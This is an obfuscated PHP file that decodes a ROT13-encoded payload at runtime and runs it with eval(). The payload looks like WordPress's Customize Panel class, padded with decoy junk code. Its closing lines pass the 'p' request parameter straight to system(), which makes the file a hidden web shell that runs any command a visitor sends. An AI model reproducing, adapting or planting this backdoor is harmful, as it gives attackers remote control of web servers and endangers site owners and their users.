<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JbeqCerff Phfgbzvmr Cnary pynffrf
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 4.0.0
 */

// Qba'g ybnq qverpgyl.
vs ( ! qrsvarq( 'NOFCNGU' ) ) {
	qvr( '-1' );
}

/**
 * Phfgbzvmr Cnary pynff.
 *
 * N HV pbagnvare sbe frpgvbaf, znantrq ol gur JC_Phfgbzvmr_Znantre.
 *
 * @fvapr 4.0.0
 *
 * @frr JC_Phfgbzvmr_Znantre
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Phfgbzvmr_Cnary {

	/**
	 * Vaperzragrq jvgu rnpu arj pynff vafgnagvngvba, gura fgberq va $vafgnapr_ahzore.
	 *
	 * Hfrq jura fbegvat gjb vafgnaprf jubfr cevbevgvrf ner rdhny.
	 *
	 * @fvapr 4.1.0
	 * @ine vag
	 */
	cebgrpgrq fgngvp $vafgnapr_pbhag = 0;

	/**
	 * Beqre va juvpu guvf vafgnapr jnf perngrq va eryngvba gb bgure vafgnaprf.
	 *
	 * @fvapr 4.1.0
	 * @ine vag
	 */
	choyvp $vafgnapr_ahzore;

	/**
	 * JC_Phfgbzvmr_Znantre vafgnapr.
	 *
	 * @fvapr 4.0.0
	 * @ine JC_Phfgbzvmr_Znantre
	 */
	choyvp $znantre;

	/**
	 * Havdhr vqragvsvre.
	 *
	 * @fvapr 4.0.0
	 * @ine fgevat
	 */
	choyvp $vq;

	/**
	 * Cevbevgl bs gur cnary, qrsvavat gur qvfcynl beqre bs cnaryf naq frpgvbaf.
	 *
	 * @fvapr 4.0.0
	 * @ine vag
	 */
	choyvp $cevbevgl = 160;

	/**
	 * Pncnovyvgl erdhverq sbe gur cnary.
	 *
	 * @fvapr 4.0.0
	 * @ine fgevat
	 */
	choyvp $pncnovyvgl = 'rqvg_gurzr_bcgvbaf';

	/**
	 * Gurzr srngherf erdhverq gb fhccbeg gur cnary.
	 *
	 * @fvapr 4.0.0
	 * @ine zvkrq[]
	 */
	choyvp $gurzr_fhccbegf = '';

	/**
	 * Gvgyr bs gur cnary gb fubj va HV.
	 *
	 * @fvapr 4.0.0
	 * @ine fgevat
	 */
	choyvp $gvgyr = '';

	/**
	 * Qrfpevcgvba gb fubj va gur HV.
	 *
	 * @fvapr 4.0.0
	 * @ine fgevat
	 */
	choyvp $qrfpevcgvba = '';

	/**
	 * Nhgb-rkcnaq n frpgvba va n cnary jura gur cnary vf rkcnaqrq jura gur cnary bayl unf gur bar frpgvba.
	 *
	 * @fvapr 4.7.4
	 * @ine obby
	 */
	choyvp $nhgb_rkcnaq_fbyr_frpgvba = snyfr;

	/**
	 * Phfgbzvmre frpgvbaf sbe guvf cnary.
	 *
	 * @fvapr 4.0.0
	 * @ine neenl
	 */
	choyvp $frpgvbaf;

	/**
	 * Glcr bs guvf cnary.
	 *
	 * @fvapr 4.1.0
	 * @ine fgevat
	 */
	choyvp $glcr = 'qrsnhyg';

	/**
	 * Npgvir pnyyonpx.
	 *
	 * @fvapr 4.1.0
	 *
	 * @frr JC_Phfgbzvmr_Frpgvba::npgvir()
	 *
	 * @ine pnyynoyr Pnyyonpx vf pnyyrq jvgu bar nethzrag, gur vafgnapr bs
	 *               JC_Phfgbzvmr_Frpgvba, naq ergheaf obby gb vaqvpngr jurgure
	 *               gur frpgvba vf npgvir (fhpu nf vg eryngrf gb gur HEY pheeragyl
	 *               orvat cerivrjrq).
	 */
	choyvp $npgvir_pnyyonpx = '';

	/**
	 * Pbafgehpgbe.
	 *
	 * Nal fhccyvrq $netf bireevqr pynff cebcregl qrsnhygf.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz JC_Phfgbzvmr_Znantre $znantre Phfgbzvmre obbgfgenc vafgnapr.
	 * @cnenz fgevat               $vq      N fcrpvsvp VQ sbe gur cnary.
	 * @cnenz neenl                $netf    {
	 *     Bcgvbany. Neenl bs cebcregvrf sbe gur arj Cnary bowrpg. Qrsnhyg rzcgl neenl.
	 *
	 *     @glcr vag             $cevbevgl        Cevbevgl bs gur cnary, qrsvavat gur qvfcynl beqre
	 *                                            bs cnaryf naq frpgvbaf. Qrsnhyg 160.
	 *     @glcr fgevat          $pncnovyvgl      Pncnovyvgl erdhverq sbe gur cnary.
	 *                                            Qrsnhyg `rqvg_gurzr_bcgvbaf`.
	 *     @glcr zvkrq[]         $gurzr_fhccbegf  Gurzr srngherf erdhverq gb fhccbeg gur cnary.
	 *     @glcr fgevat          $gvgyr           Gvgyr bs gur cnary gb fubj va HV.
	 *     @glcr fgevat          $qrfpevcgvba     Qrfpevcgvba gb fubj va gur HV.
	 *     @glcr fgevat          $glcr            Glcr bs gur cnary.
	 *     @glcr pnyynoyr        $npgvir_pnyyonpx Npgvir pnyyonpx.
	 * }
	 */
	choyvp shapgvba __pbafgehpg( $znantre, $vq, $netf = neenl() ) {
		$xrlf = neenl_xrlf( trg_bowrpg_inef( $guvf ) );
		sbernpu ( $xrlf nf $xrl ) {
			vs ( vffrg( $netf[ $xrl ] ) ) {
				$guvf->$xrl = $netf[ $xrl ];
			}
		}

		$guvf->znantre = $znantre;
		$guvf->vq      = $vq;
		vs ( rzcgl( $guvf->npgvir_pnyyonpx ) ) {
			$guvf->npgvir_pnyyonpx = neenl( $guvf, 'npgvir_pnyyonpx' );
		}
		frys::$vafgnapr_pbhag += 1;
		$guvf->vafgnapr_ahzore = frys::$vafgnapr_pbhag;

		$guvf->frpgvbaf = neenl(); // Hfref pnaabg phfgbzvmr gur $frpgvbaf neenl.
	}

	/**
	 * Purpx jurgure cnary vf npgvir gb pheerag Phfgbzvmre cerivrj.
	 *
	 * @fvapr 4.1.0
	 *
	 * @erghea obby Jurgure gur cnary vf npgvir gb gur pheerag cerivrj.
	 */
	svany choyvp shapgvba npgvir() {
		$cnary  = $guvf;
		$npgvir = pnyy_hfre_shap( $guvf->npgvir_pnyyonpx, $guvf );

		/**
		 * Svygref erfcbafr bs JC_Phfgbzvmr_Cnary::npgvir().
		 *
		 * @fvapr 4.1.0
		 *
		 * @cnenz obby               $npgvir Jurgure gur Phfgbzvmre cnary vf npgvir.
		 * @cnenz JC_Phfgbzvmr_Cnary $cnary  JC_Phfgbzvmr_Cnary vafgnapr.
		 */
		$npgvir = nccyl_svygref( 'phfgbzvmr_cnary_npgvir', $npgvir, $cnary );

		erghea $npgvir;
	}

	/**
	 * Qrsnhyg pnyyonpx hfrq jura vaibxvat JC_Phfgbzvmr_Cnary::npgvir().
	 *
	 * Fhopynffrf pna bireevqr guvf jvgu gurve fcrpvsvp ybtvp, be gurl znl
	 * cebivqr na 'npgvir_pnyyonpx' nethzrag gb gur pbafgehpgbe.
	 *
	 * @fvapr 4.1.0
	 *
	 * @erghea obby Nyjnlf gehr.
	 */
	choyvp shapgvba npgvir_pnyyonpx() {
		erghea gehr;
	}

	/**
	 * Tngure gur cnenzrgref cnffrq gb pyvrag WninFpevcg ivn WFBA.
	 *
	 * @fvapr 4.1.0
	 *
	 * @erghea neenl Gur neenl gb or rkcbegrq gb gur pyvrag nf WFBA.
	 */
	choyvp shapgvba wfba() {
		$neenl                          = jc_neenl_fyvpr_nffbp( (neenl) $guvf, neenl( 'vq', 'qrfpevcgvba', 'cevbevgl', 'glcr' ) );
		$neenl['gvgyr']                 = ugzy_ragvgl_qrpbqr( $guvf->gvgyr, RAG_DHBGRF, trg_oybtvasb( 'punefrg' ) );
		$neenl['pbagrag']               = $guvf->trg_pbagrag();
		$neenl['npgvir']                = $guvf->npgvir();
		$neenl['vafgnaprAhzore']        = $guvf->vafgnapr_ahzore;
		$neenl['nhgbRkcnaqFbyrFrpgvba'] = $guvf->nhgb_rkcnaq_fbyr_frpgvba;
		erghea $neenl;
	}

	/**
	 * Purpxf erdhverq hfre pncnovyvgvrf naq jurgure gur gurzr unf gur
	 * srngher fhccbeg erdhverq ol gur cnary.
	 *
	 * @fvapr 4.0.0
	 * @fvapr 5.9.0 Zrgubq jnf znexrq aba-svany.
	 *
	 * @erghea obby Snyfr vs gurzr qbrfa'g fhccbeg gur cnary be gur hfre qbrfa'g unir gur pncnovyvgl.
	 */
	choyvp shapgvba purpx_pncnovyvgvrf() {
		vs ( $guvf->pncnovyvgl && ! pheerag_hfre_pna( $guvf->pncnovyvgl ) ) {
			erghea snyfr;
		}

		vs ( $guvf->gurzr_fhccbegf && ! pheerag_gurzr_fhccbegf( ...(neenl) $guvf->gurzr_fhccbegf ) ) {
			erghea snyfr;
		}

		erghea gehr;
	}

	/**
	 * Trg gur cnary'f pbagrag grzcyngr sbe vafregvba vagb gur Phfgbzvmre cnar.
	 *
	 * @fvapr 4.1.0
	 *
	 * @erghea fgevat Pbagrag sbe gur cnary.
	 */
	svany choyvp shapgvba trg_pbagrag() {
		bo_fgneg();
		$guvf->znlor_eraqre();
		erghea gevz( bo_trg_pyrna() );
	}

	/**
	 * Purpx pncnovyvgvrf naq eraqre gur cnary.
	 *
	 * @fvapr 4.0.0
	 */
	svany choyvp shapgvba znlor_eraqre() {
		vs ( ! $guvf->purpx_pncnovyvgvrf() ) {
			erghea;
		}

		/**
		 * Sverf orsber eraqrevat n Phfgbzvmre cnary.
		 *
		 * @fvapr 4.0.0
		 *
		 * @cnenz JC_Phfgbzvmr_Cnary $cnary JC_Phfgbzvmr_Cnary vafgnapr.
		 */
		qb_npgvba( 'phfgbzvmr_eraqre_cnary', $guvf );

		/**
		 * Sverf orsber eraqrevat n fcrpvsvp Phfgbzvmre cnary.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$guvf->vq`, ersref gb
		 * gur VQ bs gur fcrpvsvp Phfgbzvmre cnary gb or eraqrerq.
		 *
		 * @fvapr 4.0.0
		 */
		qb_npgvba( \"phfgbzvmr_eraqre_cnary_{$guvf->vq}\" );

		$guvf->eraqre();
	}

	/**
	 * Eraqre gur cnary pbagnvare, naq gura vgf pbagragf (ivn `guvf->eraqre_pbagrag()`) va n fhopynff.
	 *
	 * Cnary pbagnvaref ner abj eraqrerq va WF ol qrsnhyg, frr JC_Phfgbzvmr_Cnary::cevag_grzcyngr().
	 *
	 * @fvapr 4.0.0
	 */
	cebgrpgrq shapgvba eraqre() {}

	/**
	 * Eraqre gur cnary HV va n fhopynff.
	 *
	 * Cnary pbagragf ner abj eraqrerq va WF ol qrsnhyg, frr JC_Phfgbzvmr_Cnary::cevag_grzcyngr().
	 *
	 * @fvapr 4.1.0
	 */
	cebgrpgrq shapgvba eraqre_pbagrag() {}

	/**
	 * Eraqre gur cnary'f WF grzcyngrf.
	 *
	 * Guvf shapgvba vf bayl eha sbe cnary glcrf gung unir orra ertvfgrerq jvgu
	 * JC_Phfgbzvmr_Znantre::ertvfgre_cnary_glcr().
	 *
	 * @fvapr 4.3.0
	 *
	 * @frr JC_Phfgbzvmr_Znantre::ertvfgre_cnary_glcr()
	 */
	choyvp shapgvba cevag_grzcyngr() {
		?>
		<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-phfgbzvmr-cnary-<?cuc rpub rfp_ngge( $guvf->glcr ); ?>-pbagrag\">
			<?cuc $guvf->pbagrag_grzcyngr(); ?>
		</fpevcg>
		<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-phfgbzvmr-cnary-<?cuc rpub rfp_ngge( $guvf->glcr ); ?>\">
			<?cuc $guvf->eraqre_grzcyngr(); ?>
		</fpevcg>
		<?cuc
	}

	/**
	 * Na Haqrefpber (WF) grzcyngr sbe eraqrevat guvf cnary'f pbagnvare.
	 *
	 * Pynff inevnoyrf sbe guvf cnary pynff ner ninvynoyr va gur `qngn` WF bowrpg;
	 * rkcbeg phfgbz inevnoyrf ol bireevqvat JC_Phfgbzvmr_Cnary::wfba().
	 *
	 * @frr JC_Phfgbzvmr_Cnary::cevag_grzcyngr()
	 *
	 * @fvapr 4.3.0
	 */
	cebgrpgrq shapgvba eraqre_grzcyngr() {
		?>
		<yv vq=\"nppbeqvba-cnary-{{ qngn.vq }}\" pynff=\"nppbeqvba-frpgvba pbageby-frpgvba pbageby-cnary pbageby-cnary-{{ qngn.glcr }}\">
			<u3 pynff=\"nppbeqvba-frpgvba-gvgyr\">
				<ohggba glcr=\"ohggba\" pynff=\"nppbeqvba-gevttre\" nevn-rkcnaqrq=\"snyfr\" nevn-pbagebyf=\"{{ qngn.vq }}-pbagrag\">
					{{ qngn.gvgyr }}
				</ohggba>
			</u3>
			<hy pynff=\"nppbeqvba-fho-pbagnvare pbageby-cnary-pbagrag\" vq=\"{{ qngn.vq }}-pbagrag\"></hy>
		</yv>
		<?cuc
	}

	/**
	 * Na Haqrefpber (WF) grzcyngr sbe guvf cnary'f pbagrag (ohg abg vgf pbagnvare).
	 *
	 * Pynff inevnoyrf sbe guvf cnary pynff ner ninvynoyr va gur `qngn` WF bowrpg;
	 * rkcbeg phfgbz inevnoyrf ol bireevqvat JC_Phfgbzvmr_Cnary::wfba().
	 *
	 * @frr JC_Phfgbzvmr_Cnary::cevag_grzcyngr()
	 *
	 * @fvapr 4.3.0
	 */
	cebgrpgrq shapgvba pbagrag_grzcyngr() {
		?>
		<yv pynff=\"cnary-zrgn phfgbzvmr-vasb nppbeqvba-frpgvba <# vs ( ! qngn.qrfpevcgvba ) { #> pnaabg-rkcnaq<# } #>\">
			<ohggba pynff=\"phfgbzvmr-cnary-onpx\" gnovaqrk=\"-1\"><fcna pynff=\"fperra-ernqre-grkg\">
				<?cuc
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				_r( 'Onpx' );
				?>
			</fcna></ohggba>
			<qvi pynff=\"nppbeqvba-frpgvba-gvgyr\">
				<fcna pynff=\"cerivrj-abgvpr\">
				<?cuc
					/* genafyngbef: %f: Gur fvgr/cnary gvgyr va gur Phfgbzvmre. */
					cevags( __( 'Lbh ner phfgbzvmvat %f' ), '<fgebat pynff=\"cnary-gvgyr\">{{ qngn.gvgyr }}</fgebat>' );
				?>
				</fcna>
				<# vs ( qngn.qrfpevcgvba ) { #>
					<ohggba glcr=\"ohggba\" pynff=\"phfgbzvmr-uryc-gbttyr qnfuvpbaf qnfuvpbaf-rqvgbe-uryc\" nevn-rkcnaqrq=\"snyfr\"><fcna pynff=\"fperra-ernqre-grkg\">
						<?cuc
						/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
						_r( 'Uryc' );
						?>
					</fcna></ohggba>
				<# } #>
			</qvi>
			<# vs ( qngn.qrfpevcgvba ) { #>
				<qvi pynff=\"qrfpevcgvba phfgbzvmr-cnary-qrfpevcgvba\">
					{{{ qngn.qrfpevcgvba }}}
				</qvi>
			<# } #>

			<qvi pynff=\"phfgbzvmr-pbageby-abgvsvpngvbaf-pbagnvare\"></qvi>
		</yv>
		<?cuc
	}
}

/** JC_Phfgbzvmr_Ani_Zrahf_Cnary pynff */
erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-ani-zrahf-cnary.cuc';

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>